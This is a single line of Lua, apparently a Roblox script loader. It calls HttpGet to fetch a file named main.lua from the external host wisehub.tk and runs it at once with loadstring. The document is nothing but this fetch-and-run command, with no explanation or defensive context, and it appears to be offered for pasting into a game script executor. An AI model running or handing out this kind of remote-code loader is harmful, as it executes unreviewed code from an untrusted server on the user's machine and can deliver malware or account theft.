loadstring(game:HttpGet(("http://wisehub.tk/main.lua"), true))()
